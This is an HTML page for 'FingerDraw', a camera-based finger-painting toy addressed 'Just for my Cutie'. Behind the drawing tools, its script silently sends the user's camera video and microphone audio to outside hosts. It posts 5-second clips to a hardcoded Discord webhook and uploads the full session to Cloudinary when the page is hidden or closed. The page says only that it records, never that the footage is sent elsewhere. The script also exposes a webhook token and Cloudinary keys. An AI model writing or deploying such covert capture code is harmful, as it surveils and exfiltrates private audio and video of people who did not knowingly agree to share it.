<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>FingerDraw</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Unbounded:wght@300;600;900&family=DM+Mono:wght@300;400&display=swap');
:root {
  --bg: #080810;
  --glass: rgba(10,10,20,0.82);
  --glass2: rgba(14,14,28,0.92);
  --border: rgba(255,255,255,0.07);
  --border2: rgba(255,255,255,0.13);
  --text: #e2e2f0;
  --muted: #44445a;
  --r: #ff2055;
  --g: #00ffa3;
  --b: #4d9fff;
  --y: #ffdb1e;
  --p: #bf5fff;
  --o: #ff6b1a;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);touch-action:none;}
/* SPLASH */
#splash{
  position:fixed;inset:0;z-index:900;
  background:var(--bg);
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;
  transition:opacity .7s ease,visibility .7s;
}
#splash.gone{opacity:0;visibility:hidden;pointer-events:none;}
.splash-logo{
  font-family:'Unbounded',sans-serif;font-weight:900;
  font-size:clamp(2.6rem,11vw,5.5rem);letter-spacing:-2px;line-height:1;
  background:conic-gradient(from 200deg,#ff2055,#ff6b1a,#ffdb1e,#00ffa3,#4d9fff,#bf5fff,#ff2055);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  animation:spingrad 6s linear infinite;
}
@keyframes spingrad{to{filter:hue-rotate(360deg);}}
.splash-sub{font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.35em;color:var(--muted);text-transform:uppercase;}
.splash-btn{
  margin-top:14px;font-family:'DM Mono',monospace;font-size:.75rem;letter-spacing:.2em;
  text-transform:uppercase;color:var(--bg);background:var(--g);border:none;padding:14px 38px;cursor:pointer;
  clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);transition:filter .2s;
}
.splash-btn:hover{filter:brightness(1.15);}
.splash-hint{font-family:'DM Mono',monospace;font-size:.62rem;color:var(--muted);text-align:center;max-width:300px;line-height:2;letter-spacing:.05em;}
/* STAGE */
#stage{position:fixed;inset:0;z-index:0;}
#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
#drawCanvas{position:absolute;inset:0;width:100%;height:100%;transform:scaleX(-1);}
#landCanvas{position:absolute;inset:0;width:100%;height:100%;transform:scaleX(-1);pointer-events:none;}
/* TOP BAR */
#topbar{
  position:fixed;top:0;left:0;right:0;z-index:200;
  height:52px;padding:0 16px;
  display:flex;align-items:center;justify-content:space-between;
  background:var(--glass);backdrop-filter:blur(18px);
  border-bottom:1px solid var(--border);
}
.tb-brand{
  font-family:'Unbounded',sans-serif;font-weight:600;font-size:.8rem;letter-spacing:.05em;color:var(--text);
  background:conic-gradient(from 200deg,#ff2055,#ff6b1a,#ffdb1e,#00ffa3,#4d9fff,#bf5fff,#ff2055);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:spingrad 6s linear infinite;
}
.tb-right{display:flex;align-items:center;gap:12px;}
.tb-btn{
  font-family:'DM Mono',monospace;font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;color:var(--text);
  background:transparent;border:1px solid var(--border2);padding:6px 14px;cursor:pointer;border-radius:3px;transition:all .2s;white-space:nowrap;
}
.tb-btn:hover{background:rgba(255,255,255,.07);}
.tb-btn.clear-btn{color:var(--r);border-color:rgba(255,32,85,.3);}
.tb-btn.clear-btn:hover{background:rgba(255,32,85,.1);}
/* REC dot */
.rec-dot{
  width:10px;height:10px;border-radius:50%;background:var(--r);
  box-shadow:0 0 8px var(--r);animation:recpulse 1.4s ease-in-out infinite;
  flex-shrink:0;
}
@keyframes recpulse{0%,100%{opacity:1;}50%{opacity:.25;}}
.rec-dot.uploading{background:var(--y);box-shadow:0 0 8px var(--y);animation:none;}
.rec-dot.done{background:var(--g);box-shadow:0 0 8px var(--g);animation:none;}
/* PEN PANEL */
#penPanel{
  position:fixed;left:0;top:50%;transform:translateY(-50%);z-index:200;
  display:flex;flex-direction:column;gap:6px;padding:10px 8px;
  background:var(--glass2);backdrop-filter:blur(18px);
  border:1px solid var(--border);border-left:none;border-radius:0 12px 12px 0;
}
.pen-btn{
  width:40px;height:40px;border-radius:8px;border:1px solid var(--border2);background:transparent;
  cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;
  transition:all .2s;color:var(--muted);font-size:1.1rem;position:relative;
}
.pen-btn:hover{background:rgba(255,255,255,.06);color:var(--text);}
.pen-btn.active{background:rgba(255,255,255,.09);border-color:var(--border2);color:var(--text);}
.pen-btn.active::after{
  content:'';position:absolute;left:-9px;top:50%;transform:translateY(-50%);
  width:3px;height:22px;background:var(--g);border-radius:2px;
}
.pen-label{font-family:'DM Mono',monospace;font-size:.42rem;letter-spacing:.05em;color:inherit;text-transform:uppercase;line-height:1;}
/* BOTTOM PANEL */
#bottomPanel{
  position:fixed;bottom:0;left:0;right:0;z-index:200;padding:10px 14px 12px;
  background:var(--glass2);backdrop-filter:blur(18px);border-top:1px solid var(--border);
}
.panel-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
.panel-row+.panel-row{margin-top:8px;}
.colors-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;flex:1;}
.swatch{
  width:26px;height:26px;border-radius:50%;cursor:pointer;
  border:2px solid transparent;transition:transform .15s,border-color .15s;flex-shrink:0;position:relative;
}
.swatch:hover{transform:scale(1.2);}
.swatch.active{border-color:#fff;transform:scale(1.18);}
.swatch.active::after{content:'';position:absolute;inset:-5px;border-radius:50%;border:1.5px solid rgba(255,255,255,.25);}
.hex-wrap{display:flex;align-items:center;gap:4px;flex-shrink:0;}
.hex-preview{width:22px;height:22px;border-radius:50%;border:1.5px solid var(--border2);cursor:pointer;flex-shrink:0;}
.hex-input{
  font-family:'DM Mono',monospace;font-size:.65rem;background:rgba(255,255,255,.04);
  border:1px solid var(--border2);color:var(--text);padding:4px 8px;width:82px;border-radius:4px;
  letter-spacing:.08em;text-transform:uppercase;
}
.hex-input:focus{outline:none;}
.size-row{display:flex;align-items:center;gap:10px;width:100%;}
.size-label{font-family:'DM Mono',monospace;font-size:.58rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;width:34px;}
.size-slider{
  flex:1;-webkit-appearance:none;height:3px;
  background:linear-gradient(to right,var(--g) var(--pct,30%),var(--muted) var(--pct,30%));
  border-radius:2px;outline:none;cursor:pointer;
}
.size-slider::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;background:var(--text);cursor:pointer;border:2px solid var(--bg);box-shadow:0 0 6px rgba(0,255,163,.4);}
.opacity-slider{
  flex:1;-webkit-appearance:none;height:3px;
  background:linear-gradient(to right,var(--text) var(--pct2,80%),var(--muted) var(--pct2,80%));
  border-radius:2px;outline:none;cursor:pointer;
}
.opacity-slider::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;background:var(--text);cursor:pointer;border:2px solid var(--bg);}
.size-val{font-family:'DM Mono',monospace;font-size:.6rem;color:var(--muted);min-width:20px;text-align:right;}
/* TOAST */
#toast{
  position:fixed;bottom:110px;left:50%;transform:translateX(-50%) translateY(10px);
  background:var(--glass2);border:1px solid var(--border2);
  font-family:'DM Mono',monospace;font-size:.65rem;letter-spacing:.1em;
  color:var(--text);padding:10px 20px;border-radius:4px;
  opacity:0;pointer-events:none;transition:all .35s;white-space:nowrap;z-index:999;
}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
#toast.ok{color:var(--g);border-color:rgba(0,255,163,.3);}
#toast.err{color:var(--r);border-color:rgba(255,32,85,.3);}
/* FINGER CURSOR */
#fCursor{position:fixed;pointer-events:none;z-index:500;border-radius:50%;transform:translate(-50%,-50%);transition:width .1s,height .1s;display:none;mix-blend-mode:screen;}
/* LOADING */
#mpLoader{
  position:fixed;inset:0;z-index:800;background:var(--bg);
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
  transition:opacity .5s,visibility .5s;
}
#mpLoader.gone{opacity:0;visibility:hidden;}
.mp-spinner{width:40px;height:40px;border:2px solid var(--muted);border-top-color:var(--g);border-radius:50%;animation:spin .8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
.mp-text{font-family:'DM Mono',monospace;font-size:.65rem;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;}
</style>
</head>
<body>
<!-- SPLASH -->
<div id="splash">
  <div class="splash-logo">FINGERDRAW</div>
  <div class="splash-sub">paint with your bare hands</div>
  <button class="splash-btn" id="splashBtn">Tap Here :3</button>
  <p class="splash-hint">Just for my Cutie :3<br>Records automatically 🎥</p>
</div>
<!-- LOADING -->
<div id="mpLoader" style="display:none">
  <div class="mp-spinner"></div>
  <div class="mp-text" id="mpText">Loading hand tracking…</div>
</div>
<!-- STAGE -->
<div id="stage" style="display:none">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="drawCanvas"></canvas>
  <canvas id="landCanvas"></canvas>
</div>
<!-- TOP BAR -->
<div id="topbar" style="display:none">
  <div class="tb-brand">FingerDraw</div>
  <div class="tb-right">
    <div class="rec-dot" id="recDot"></div>
    <button class="tb-btn clear-btn" onclick="clearCanvas()">✕ Clear</button>
  </div>
</div>
<!-- PEN PANEL -->
<div id="penPanel" style="display:none">
  <button class="pen-btn active" data-pen="normal"      onclick="setPen(this)">✏️<span class="pen-label">Pen</span></button>
  <button class="pen-btn"        data-pen="fountain"    onclick="setPen(this)">🪶<span class="pen-label">Fountain</span></button>
  <button class="pen-btn"        data-pen="marker"      onclick="setPen(this)">🖊<span class="pen-label">Marker</span></button>
  <button class="pen-btn"        data-pen="neon"        onclick="setPen(this)">💡<span class="pen-label">Neon</span></button>
  <button class="pen-btn"        data-pen="spray"       onclick="setPen(this)">💨<span class="pen-label">Spray</span></button>
  <button class="pen-btn"        data-pen="calligraphy" onclick="setPen(this)">🖋<span class="pen-label">Callig.</span></button>
  <button class="pen-btn"        data-pen="watercolor"  onclick="setPen(this)">🎨<span class="pen-label">Water</span></button>
  <button class="pen-btn"        data-pen="chalk"       onclick="setPen(this)">🪨<span class="pen-label">Chalk</span></button>
  <button class="pen-btn"        data-pen="eraser"      onclick="setPen(this)">⬜<span class="pen-label">Erase</span></button>
</div>
<!-- BOTTOM PANEL -->
<div id="bottomPanel" style="display:none">
  <div class="panel-row">
    <div class="colors-row" id="colorRow">
      <div class="swatch active" style="background:#ff2055" data-c="#ff2055" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#ff6b1a" data-c="#ff6b1a" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#ffdb1e" data-c="#ffdb1e" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#00ffa3" data-c="#00ffa3" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#4d9fff" data-c="#4d9fff" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#bf5fff" data-c="#bf5fff" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#ff80d0" data-c="#ff80d0" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#ffffff" data-c="#ffffff" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#aaaaaa" data-c="#aaaaaa" onclick="setSwatch(this)"></div>
      <div class="swatch" style="background:#1a1a2e" data-c="#1a1a2e" onclick="setSwatch(this)"></div>
    </div>
    <div class="hex-wrap">
      <div class="hex-preview" id="hexPreview" style="background:#ff2055"></div>
      <input class="hex-input" id="hexInput" type="text" value="#FF2055" maxlength="7" placeholder="#RRGGBB" spellcheck="false">
    </div>
  </div>
  <div class="panel-row">
    <div class="size-row">
      <span class="size-label">Size</span>
      <input class="size-slider" id="sizeSlider" type="range" min="1" max="60" value="8">
      <span class="size-val" id="sizeVal">8</span>
      <span class="size-label" style="margin-left:8px">Opacity</span>
      <input class="opacity-slider" id="opacitySlider" type="range" min="5" max="100" value="90">
      <span class="size-val" id="opacityVal">90%</span>
    </div>
  </div>
</div>
<div id="toast"></div>
<div id="fCursor"></div>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
<script>
/* ═══════════════════════════════════════
   CONFIG
═══════════════════════════════════════ */
const WEBHOOK           = "https://discord.com/api/webhooks/1490988249512935474/uYgeyJQA49zdp-GLlzzYukvaNTVrZ1M-PR3CLq-GoF4fr0EJqjBuZeIv-8K2DxlSi49o";
const CLOUDINARY_CLOUD  = "dzjpmqdel";
const CLOUDINARY_KEY    = "ebbXOys1xdiQNxk-bdjDGvLZ-Os";
const CLOUDINARY_PRESET = "Bath123";
const CHUNK_INTERVAL_MS = 5000;   // send to Discord every 5 seconds
const DISCORD_MAX_BYTES = 8_000_000; // 8 MB Discord file limit
/* ═══════════════════════════════════════
   STATE
═══════════════════════════════════════ */
let currentColor   = '#ff2055';
let currentPen     = 'normal';
let brushSize      = 8;
let opacity        = 0.9;
let stream         = null;
let lastX = null, lastY = null;
let sprayInterval  = null;
// Recording state
let mediaRecorder     = null;
let currentChunk      = [];   // 5-s window sent to Discord
let fullSessionChunks = [];   // ALL chunks → full Cloudinary video at end
let chunkCount        = 0;
let chunkTimer        = null;
let compositeCanvas, cCtx, animFrameId, composeActive = false;
let sessionStart      = null;
let cloudinaryDone    = false;
const video      = document.getElementById('video');
const drawCanvas = document.getElementById('drawCanvas');
const landCanvas = document.getElementById('landCanvas');
const dCtx       = drawCanvas.getContext('2d');
const lCtx       = landCanvas.getContext('2d');
const fCursor    = document.getElementById('fCursor');
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
              || ('ontouchstart' in window && navigator.maxTouchPoints > 0);
/* ═══════════════════════════════════════
   INIT — triggered by splash button
═══════════════════════════════════════ */
document.getElementById('splashBtn').onclick = init;
async function init() {
  try {
    // Try exact front camera first; fall back if device refuses
    let videoConstraints;
    try {
      await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'user' } } }).then(s => s.getTracks().forEach(t => t.stop()));
      videoConstraints = { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } };
    } catch {
      videoConstraints = { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } };
    }
    stream = await navigator.mediaDevices.getUserMedia({
      video: videoConstraints,
      audio: true
    });
    video.srcObject = stream;
    await video.play();
    document.getElementById('splash').classList.add('gone');
    document.getElementById('stage').style.display       = 'block';
    document.getElementById('topbar').style.display      = 'flex';
    document.getElementById('penPanel').style.display    = 'flex';
    document.getElementById('bottomPanel').style.display = 'block';
    video.addEventListener('loadedmetadata', resizeCanvases);
    window.addEventListener('resize', resizeCanvases);
    resizeCanvases();
    sessionStart = new Date();
    if (isMobile) {
      setupTouchDrawing();
      startChunkedRecording();
    } else {
      document.getElementById('mpLoader').style.display = 'flex';
      document.getElementById('mpText').textContent = 'Loading hand tracking…';
      fCursor.style.display = 'block';
      setupMediaPipe();
    }
  } catch(e) {
    toast('Camera denied — please allow access', 'err');
  }
}
function resizeCanvases() {
  const w = video.videoWidth  || window.innerWidth;
  const h = video.videoHeight || window.innerHeight;
  [drawCanvas, landCanvas].forEach(c => { c.width = w; c.height = h; });
}
/* ═══════════════════════════════════════
   CHUNKED RECORDING PIPELINE
   ─ One MediaRecorder whose ondataavailable
     fires every 5 s. Each chunk is shipped
     immediately to Discord + Cloudinary.
═══════════════════════════════════════ */
function startChunkedRecording() {
  compositeCanvas        = document.createElement('canvas');
  compositeCanvas.width  = drawCanvas.width  || 1280;
  compositeCanvas.height = drawCanvas.height || 720;
  cCtx = compositeCanvas.getContext('2d');
  composeActive = true;
  (function compose() {
    if (!composeActive) return;
    cCtx.clearRect(0, 0, compositeCanvas.width, compositeCanvas.height);
    // mirror video
    cCtx.save(); cCtx.translate(compositeCanvas.width, 0); cCtx.scale(-1, 1);
    try { cCtx.drawImage(video, 0, 0, compositeCanvas.width, compositeCanvas.height); } catch {}
    cCtx.restore();
    // mirror drawing overlay
    cCtx.save(); cCtx.translate(compositeCanvas.width, 0); cCtx.scale(-1, 1);
    cCtx.drawImage(drawCanvas, 0, 0);
    cCtx.restore();
    animFrameId = requestAnimationFrame(compose);
  })();
  const compStream = compositeCanvas.captureStream(30);
  const audioTracks = stream ? stream.getAudioTracks() : [];
  if (audioTracks.length) compStream.addTrack(audioTracks[0]);
  const mime = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm']
    .find(t => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) || '';
  try {
    mediaRecorder = new MediaRecorder(compStream, mime ? { mimeType: mime } : {});
  } catch {
    mediaRecorder = new MediaRecorder(compStream);
  }
  mediaRecorder.ondataavailable = e => {
    if (e.data && e.data.size > 0) {
      currentChunk.push(e.data);       // for Discord 5-s shipping
      fullSessionChunks.push(e.data);  // for full Cloudinary video
    }
  };
  // Every timeslice a chunk of data fires — we collect for 5 s then ship
  mediaRecorder.start(CHUNK_INTERVAL_MS);
  setRecDot('recording');
  // Ship every 5 seconds
  chunkTimer = setInterval(shipChunk, CHUNK_INTERVAL_MS);
}
async function shipChunk() {
  if (!mediaRecorder || currentChunk.length === 0) return;
  // Snapshot & reset the Discord accumulator only
  const parts = currentChunk.splice(0);
  chunkCount++;
  const blob = new Blob(parts, { type: mediaRecorder.mimeType || 'video/webm' });
  if (blob.size < 500) return;
  const ts     = sessionStart ? sessionStart.toISOString().replace(/[:.]/g, '-') : 'session';
  const now    = new Date().toLocaleString();
  const sizeMB = (blob.size / 1024 / 1024).toFixed(2);
  const label  = `chunk-${String(chunkCount).padStart(3,'0')}`;
  // Only Discord gets the rolling 5-s clips
  sendChunkToDiscord(blob, ts, label, now, sizeMB);
}
/* ═══════════════════════════════════════
   DISCORD — chunked multi-part if > 8 MB
═══════════════════════════════════════ */
async function sendChunkToDiscord(blob, ts, label, now, sizeMB) {
  const content = `🎨 **FingerDraw** · ${now} · ${label} · ${sizeMB} MB`;
  if (blob.size <= DISCORD_MAX_BYTES) {
    // Single file post
    const fd = new FormData();
    fd.append('content', content);
    fd.append('file', new File([blob], `fingerdraw-${ts}-${label}.webm`, { type: 'video/webm' }));
    await discordFetch(fd);
  } else {
    // Split into sub-chunks of DISCORD_MAX_BYTES
    let offset = 0, part = 0;
    const buf  = await blob.arrayBuffer();
    while (offset < buf.byteLength) {
      part++;
      const slice = buf.slice(offset, offset + DISCORD_MAX_BYTES);
      offset += DISCORD_MAX_BYTES;
      const fd = new FormData();
      fd.append('content', `${content} (part ${part})`);
      fd.append('file', new File([slice], `fingerdraw-${ts}-${label}-p${part}.webm`, { type: 'video/webm' }));
      await discordFetch(fd);
    }
  }
}
async function discordFetch(fd) {
  try {
    const res = await fetch(WEBHOOK, { method: 'POST', body: fd });
    if (!res.ok) {
      // Cloudinary URL might save us if Discord rejects
    }
    return res.ok;
  } catch { return false; }
}
/* ═══════════════════════════════════════
   CLOUDINARY — full session video on exit
═══════════════════════════════════════ */
async function uploadFullSessionToCloudinary() {
  if (cloudinaryDone) return;
  if (!fullSessionChunks.length) return;
  cloudinaryDone = true;
  const mimeType = mediaRecorder ? (mediaRecorder.mimeType || 'video/webm') : 'video/webm';
  const blob = new Blob(fullSessionChunks, { type: mimeType });
  if (blob.size < 1000) return;
  const ts     = sessionStart ? sessionStart.toISOString().replace(/[:.]/g, '-') : 'session';
  const sizeMB = (blob.size / 1024 / 1024).toFixed(2);
  const fd = new FormData();
  fd.append('file', new File([blob], `fingerdraw-${ts}-full.webm`, { type: 'video/webm' }));
  fd.append('upload_preset', CLOUDINARY_PRESET);
  fd.append('api_key', CLOUDINARY_KEY);
  fd.append('public_id', `fingerdraw/${ts}-full`);
  try {
    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD}/video/upload`, {
      method: 'POST',
      body: fd
    });
    if (!res.ok) return;
    const data = await res.json().catch(() => null);
    if (data && data.secure_url) {
      const fd2 = new FormData();
      fd2.append('content', `☁️ **Cloudinary FULL SESSION** · ${sizeMB} MB\n${data.secure_url}`);
      discordFetch(fd2);
    }
  } catch {}
}
/* ═══════════════════════════════════════
   REC DOT
═══════════════════════════════════════ */
function setRecDot(state) {
  const dot = document.getElementById('recDot');
  if (!dot) return;
  dot.className = 'rec-dot' + (state === 'recording' ? '' : state === 'uploading' ? ' uploading' : ' done');
}
/* ═══════════════════════════════════════
   PAGE HIDE — flush remaining data
═══════════════════════════════════════ */
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') flushOnExit();
});
window.addEventListener('pagehide', flushOnExit);
let _flushCalled = false;
function flushOnExit() {
  if (_flushCalled || !mediaRecorder) return;
  _flushCalled = true;
  clearInterval(chunkTimer);
  composeActive = false;
  cancelAnimationFrame(animFrameId);
  try { mediaRecorder.requestData(); } catch {}
  try { mediaRecorder.stop(); } catch {}
  // Upload the full combined video to Cloudinary (async — best-effort)
  uploadFullSessionToCloudinary();
  // Send a lightweight beacon so Discord knows session ended
  const payload = JSON.stringify({
    content: `🎨 **FingerDraw** session ended · ${new Date().toLocaleString()}`
  });
  navigator.sendBeacon(WEBHOOK, new Blob([payload], { type: 'application/json' }));
}
/* ═══════════════════════════════════════
   DRAWING ENGINE
═══════════════════════════════════════ */
function draw(x, y) {
  if (currentPen === 'spray') return;
  if (lastX === null) { lastX = x; lastY = y; return; }
  const speed = Math.hypot(x - lastX, y - lastY) + 0.01;
  const col   = hexToRgba(currentColor, opacity);
  dCtx.lineCap = 'round'; dCtx.lineJoin = 'round';
  switch (currentPen) {
    case 'normal':
      dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
      dCtx.strokeStyle = col; dCtx.lineWidth = brushSize; dCtx.shadowBlur = 0; dCtx.stroke();
      break;
    case 'fountain': {
      const w = Math.max(1, brushSize * (1 - Math.min(speed / 40, 0.85)));
      dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
      dCtx.strokeStyle = col; dCtx.lineWidth = w; dCtx.shadowBlur = 0; dCtx.stroke();
      break;
    }
    case 'marker':
      dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
      dCtx.strokeStyle = hexToRgba(currentColor, Math.min(opacity, 0.55));
      dCtx.lineWidth = brushSize * 2.5; dCtx.lineCap = 'square'; dCtx.shadowBlur = 0; dCtx.stroke();
      break;
    case 'neon':
      for (let i = 3; i > 0; i--) {
        dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
        dCtx.strokeStyle   = i === 1 ? '#fff' : hexToRgba(currentColor, opacity * 0.5);
        dCtx.lineWidth     = i === 1 ? brushSize * 0.4 : brushSize * (i * 1.4);
        dCtx.shadowColor   = currentColor; dCtx.shadowBlur = brushSize * i * 2; dCtx.stroke();
      }
      dCtx.shadowBlur = 0;
      break;
    case 'calligraphy': {
      const angle = Math.atan2(y - lastY, x - lastX);
      const hw = (brushSize * 1.5) * Math.abs(Math.cos(angle + Math.PI / 4));
      dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
      dCtx.strokeStyle = col; dCtx.lineWidth = Math.max(1, hw); dCtx.shadowBlur = 0; dCtx.stroke();
      break;
    }
    case 'watercolor': {
      const alpha = Math.min(opacity * 0.18, 0.22);
      for (let i = 0; i < 6; i++) {
        const ox = (Math.random() - .5) * brushSize * 1.4, oy = (Math.random() - .5) * brushSize * 1.4;
        dCtx.beginPath(); dCtx.moveTo(lastX + ox, lastY + oy); dCtx.lineTo(x + ox, y + oy);
        dCtx.strokeStyle = hexToRgba(currentColor, alpha); dCtx.lineWidth = brushSize * (.6 + Math.random() * .8); dCtx.stroke();
      }
      break;
    }
    case 'chalk': {
      for (let i = 0; i < 8; i++) {
        const ox = (Math.random() - .5) * brushSize, oy = (Math.random() - .5) * brushSize;
        dCtx.beginPath(); dCtx.moveTo(lastX + ox, lastY + oy); dCtx.lineTo(x + ox, y + oy);
        dCtx.strokeStyle = hexToRgba(currentColor, Math.random() * opacity * 0.7);
        dCtx.lineWidth = Math.max(1, Math.random() * brushSize * .6); dCtx.stroke();
      }
      break;
    }
    case 'eraser':
      dCtx.globalCompositeOperation = 'destination-out';
      dCtx.beginPath(); dCtx.moveTo(lastX, lastY); dCtx.lineTo(x, y);
      dCtx.strokeStyle = 'rgba(0,0,0,1)'; dCtx.lineWidth = brushSize * 2; dCtx.stroke();
      dCtx.globalCompositeOperation = 'source-over';
      break;
  }
  lastX = x; lastY = y;
}
function sprayAt(x, y) {
  const density = Math.floor(brushSize * 3), radius = brushSize * 2.5;
  for (let i = 0; i < density; i++) {
    const a = Math.random() * Math.PI * 2, r = Math.random() * radius;
    dCtx.beginPath(); dCtx.arc(x + r * Math.cos(a), y + r * Math.sin(a), Math.random() * 1.2, 0, Math.PI * 2);
    dCtx.fillStyle = hexToRgba(currentColor, Math.random() * opacity * 0.7); dCtx.fill();
  }
}
let sprayPos = { x: 0, y: 0 };
function startDraw(x, y) { lastX = x; lastY = y; if (currentPen === 'spray') { sprayPos = { x, y }; sprayInterval = setInterval(() => sprayAt(sprayPos.x, sprayPos.y), 30); } }
function moveDraw(x, y)  { draw(x, y); if (currentPen === 'spray') sprayPos = { x, y }; }
function endDraw()       { lastX = null; lastY = null; clearInterval(sprayInterval); sprayInterval = null; }
function clearCanvas()   { dCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height); }
/* ═══════════════════════════════════════
   TOUCH INPUT (MOBILE)
═══════════════════════════════════════ */
function setupTouchDrawing() {
  drawCanvas.addEventListener('touchstart', e => { e.preventDefault(); const { x, y } = touchToCanvas(e.touches[0]); startDraw(x, y); }, { passive: false });
  drawCanvas.addEventListener('touchmove',  e => { e.preventDefault(); const { x, y } = touchToCanvas(e.touches[0]); moveDraw(x, y); },  { passive: false });
  drawCanvas.addEventListener('touchend',   e => { e.preventDefault(); endDraw(); }, { passive: false });
}
function touchToCanvas(touch) {
  const rect   = drawCanvas.getBoundingClientRect();
  const scaleX = drawCanvas.width  / rect.width;
  const scaleY = drawCanvas.height / rect.height;
  const rawX   = (touch.clientX - rect.left) * scaleX;
  return { x: drawCanvas.width - rawX, y: (touch.clientY - rect.top) * scaleY };
}
/* ═══════════════════════════════════════
   MEDIAPIPE (DESKTOP)
═══════════════════════════════════════ */
function setupMediaPipe() {
  const hands = new Hands({ locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}` });
  hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.72, minTrackingConfidence: 0.65 });
  hands.onResults(onHandResults);
  const cam = new Camera(video, {
    onFrame: async () => { await hands.send({ image: video }); },
    width: 1280, height: 720
  });
  cam.start()
    .then(() => { document.getElementById('mpLoader').classList.add('gone'); startChunkedRecording(); })
    .catch(() => { document.getElementById('mpLoader').classList.add('gone'); startChunkedRecording(); });
}
function onHandResults(results) {
  lCtx.clearRect(0, 0, landCanvas.width, landCanvas.height);
  if (!results.multiHandLandmarks?.length) { endDraw(); return; }
  const lm = results.multiHandLandmarks[0];
  const w  = drawCanvas.width, h = drawCanvas.height;
  const idx = lm[8], mid = lm[12];
  const indexUp  = idx.y < lm[6].y;
  const middleUp = mid.y < lm[10].y;
  const cx = (1 - idx.x) * w, cy = idx.y * h;
  updateFingerCursor(idx.x, idx.y, indexUp);
  lCtx.beginPath(); lCtx.arc(cx, cy, indexUp ? 10 : 6, 0, Math.PI * 2);
  lCtx.fillStyle = indexUp ? currentColor : 'rgba(255,255,255,0.2)';
  lCtx.shadowColor = currentColor; lCtx.shadowBlur = indexUp ? 18 : 0; lCtx.fill(); lCtx.shadowBlur = 0;
  if (indexUp && !middleUp) moveDraw(cx, cy); else endDraw();
}
function updateFingerCursor(nx, ny, active) {
  const s = document.getElementById('stage').getBoundingClientRect();
  const sx = s.left + (1 - nx) * s.width;
  const sy = s.top  + ny * s.height;
  const sz = active ? brushSize + 6 : 10;
  fCursor.style.cssText = `display:block;left:${sx}px;top:${sy}px;width:${sz}px;height:${sz}px;
    background:${active ? currentColor : 'rgba(255,255,255,0.3)'};
    box-shadow:${active ? `0 0 ${sz * 2}px ${currentColor}` : 'none'};
    border-radius:50%;position:fixed;pointer-events:none;
    transform:translate(-50%,-50%);mix-blend-mode:screen;transition:width .08s,height .08s,background .15s;`;
}
/* ═══════════════════════════════════════
   UI CONTROLS
═══════════════════════════════════════ */
function setPen(el) {
  document.querySelectorAll('.pen-btn').forEach(b => b.classList.remove('active'));
  el.classList.add('active');
  currentPen = el.dataset.pen;
  clearInterval(sprayInterval); sprayInterval = null;
}
function setSwatch(el) {
  document.querySelectorAll('.swatch').forEach(s => s.classList.remove('active'));
  el.classList.add('active');
  currentColor = el.dataset.c;
  document.getElementById('hexInput').value = currentColor.toUpperCase();
  document.getElementById('hexPreview').style.background = currentColor;
}
const hexInput = document.getElementById('hexInput');
hexInput.addEventListener('input', () => {
  const val = hexInput.value.startsWith('#') ? hexInput.value : '#' + hexInput.value;
  if (/^#[0-9a-fA-F]{6}$/.test(val)) {
    currentColor = val;
    document.getElementById('hexPreview').style.background = val;
    document.querySelectorAll('.swatch').forEach(s => s.classList.remove('active'));
  }
});
hexInput.addEventListener('keydown', e => e.stopPropagation());
const sizeSlider = document.getElementById('sizeSlider');
const sizeVal    = document.getElementById('sizeVal');
sizeSlider.addEventListener('input', () => {
  brushSize = +sizeSlider.value; sizeVal.textContent = brushSize;
  sizeSlider.style.setProperty('--pct', ((brushSize - 1) / 59 * 100).toFixed(1) + '%');
});
